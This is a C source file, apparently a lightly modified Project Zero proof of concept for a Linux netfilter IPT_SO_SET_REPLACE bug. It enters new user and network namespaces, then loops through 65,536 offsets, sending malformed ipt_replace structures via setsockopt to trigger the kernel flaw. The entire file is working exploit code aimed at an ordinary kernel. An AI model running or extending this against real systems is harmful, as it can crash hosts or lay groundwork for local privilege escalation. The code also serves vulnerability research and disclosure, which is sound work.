/*
 * THis is a slightly modified version of the code described in
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=758&redir=1
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <linux/sched.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <fcntl.h>
#include <sys/wait.h>

int netfilter_setsockopt(void *p)
{
	int sock;
	int ret;
	void *data;
	size_t size;
	struct ipt_replace *repl;
	struct ipt_entry *entry;
	struct xt_standard_target *target;
	int x;

	for (x = 0; x < 65536; x++) {

		sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

		if (sock == -1) {
			perror("socket");
			return -1;
		}

		size =
		    sizeof(struct ipt_replace) + sizeof(struct ipt_entry) +
		    sizeof(struct xt_standard_target) + 4;

		data = malloc(size);

		if (data == NULL) {
			perror("malloc");
			return -1;
		}

		memset(data, 0, size);

		repl = (struct ipt_replace *)data;
		entry = (struct ipt_entry *)(data + sizeof(struct ipt_replace));
		target =
		    (struct xt_standard_target *)(data +
						  sizeof(struct ipt_replace) +
						  sizeof(struct ipt_entry) + 4);

		repl->num_counters = 0x1;
		repl->size =
		    sizeof(struct ipt_entry) +
		    sizeof(struct xt_standard_target);
		repl->valid_hooks = 0x1;
		repl->num_entries = 0x1;

		memset(&repl->underflow, 1, sizeof(repl->underflow));
		repl->underflow[0] = 0;

		entry->next_offset = x;
		entry->target_offset = sizeof(struct ipt_entry) + 4;

		target->verdict = -(NF_ACCEPT + 1);

		ret =
		    setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *)data,
			       size);

		close(sock);
		free(data);

		if (ret != -1) {
			printf("repl %p (%lx) entry %p (%lx) target %p\n", repl,
			       sizeof(struct ipt_replace), entry,
			       sizeof(struct ipt_entry), target);

			printf("done %d => %d\n", x, ret);
		}
	}

	return ret;
}

int main(void)
{
	void *stack;
	int ret;

	ret = unshare(CLONE_NEWUSER);
	if (ret == -1) {
		fprintf(stderr, "unshare failed: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	stack = (void *)malloc(65536);
	if (stack == NULL) {
		fprintf(stderr, "malloc failed: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	pid_t pid =
	    clone(netfilter_setsockopt, stack + 65536, CLONE_NEWNET, NULL);
	if (pid < 0) {
		fprintf(stderr, "clone failed: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}
	// lets wait on our child process here before we, the parent, exits
	if (waitpid(pid, NULL, 0) == -1) {
		fprintf(stderr, "failed to wait pid %d\n", pid);
		exit(EXIT_FAILURE);
	}
	exit(EXIT_SUCCESS);
}
